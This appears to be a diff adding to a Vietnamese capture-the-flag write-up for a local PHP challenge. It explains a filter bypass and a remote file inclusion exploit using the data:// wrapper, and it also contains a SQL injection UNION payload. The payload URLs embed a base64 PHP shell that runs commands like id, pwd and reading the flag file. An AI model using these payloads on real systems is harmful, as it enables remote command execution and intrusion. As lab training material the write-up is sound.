@@ -92,13 +92,52 @@ amount=-1/*&name=*/%20UNION%20select%201,CONCAT(COLUMN_NAME),TABLE_NAME%20from%2
 - Và cuối cùng nó sẽ chạy vào hàm include và thi hành biến $url 
 
 => Từ phân tích ta thấy được tham số url đầu vào sẽ bị lọc rất nhìu và yêu cầu bắt buộc host nhienit.kma và port 2010 => Có khi nào để tránh mình dùng localhost để khai thác SSRF không ta 
-=> Và ở cuối ta để ý rằng sau khi kiểm tra hoàn tất thì nó sẽ đc thi hành bởi hàm include => Đây cũng là 1 dấu hiệu cho lỗ hổng file include + với trong file source code ta thấy thêm 1 file .htaccess => `php_flag allow_url_include on` 
+=> Và ở cuối ta để ý rằng sau khi kiểm tra hoàn tất thì nó sẽ đc thi hành bởi hàm include => Đây cũng là 1 dấu hiệu cho lỗ hổng file include + với trong file source code ta thấy thêm 1 file .htaccess => `php_flag allow_url_include on` => Cấu hình này cho phép truy xuất dữ liệu từ xa => Dẫn đến có thể được khai thác bởi lỗ hổng remote file include 
 
+![image](https://user-images.githubusercontent.com/57553555/162566971-91ef1483-2b00-4587-a0a3-f0f801ee6b89.png)
 
+##  Kiểm tra lỗi 
+- Ý tưởng : Đầu tiên ta sẽ tìm cách bypass tất cả các filter => Sau đó khi đã vào đc hàm include => Ta sẽ khai thác rlf => Tìm flag
 
+### Bypass 
+- Để thõa mãn tất cả yêu cầu => thì tham số url sẽ là :
+```url
+http://localhost:10016/?url=http://nhienit.kma:2010/
+```
 
+![image](https://user-images.githubusercontent.com/57553555/162567312-ea4fd082-6099-4360-aca3-799b70b8fa10.png)
 
+### RFI exploit 
+- Để có thể khai thác RFI của trang => Ta sử dụng `data: wrapper` => Đây là 1 payload để khai thác [Nguồn](https://www.alak.cc/2011/03/self-contained-rfi-in-php.html)
 
+![image](https://user-images.githubusercontent.com/57553555/162567600-d9be4e5c-88e4-4977-8319-1237bef57ea1.png)
 
+- Ta test thử payload với url đã bypass ở trên : 
+```url
+http://localhost:10016/?url=http://nhienit.kma:2010/?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=dir
+```
+![image](https://user-images.githubusercontent.com/57553555/162567726-74c00a21-4b87-455e-b267-daf4f3383bf6.png)
 
+=> Nhưng nhìn kĩ lại có vẻ như `?` đã bị lọc => Và data wrapper vẫn còn 1 cách khai thác nữa là `data://text/plain;data...`
+
+- Để có thể thông qua các filter thì url phải có `url=http://nhienit.kma:2010/` => và ta tìm cách thêm chèn `data://` => Và đây là payload : 
+
+```url
+http://localhost:10016/?url=data://nhienit.kma:2010/http://nhienit.kma:2010/;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=id
+```
+
+![image](https://user-images.githubusercontent.com/57553555/162568740-b2b0b2a0-d903-4aaf-8593-bf8cbd64517c.png)
+
+=> Thành công thi hành shell code id => Tiếp theo là tìm flag trên server thôi 
+
+### Khai thác
+- Ta kiểm tra thư mục hiện tại bằng lệnh `pwd` 
+```url
+http://localhost:10016/?url=data://nhienit.kma:2010/http://nhienit.kma:2010/;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=pwd
+```
+![image](https://user-images.githubusercontent.com/57553555/162568836-59c3500d-bc15-4e84-ab02-57d18b3d033d.png)
+
+=> Có thể flag nằm ở file root => Ta kiểm tra thử `cat ../../../flag` => Flag 
+
+![image](https://user-images.githubusercontent.com/57553555/162569002-963aa3c0-67bf-4c41-b891-7c277c00b205.png)
 
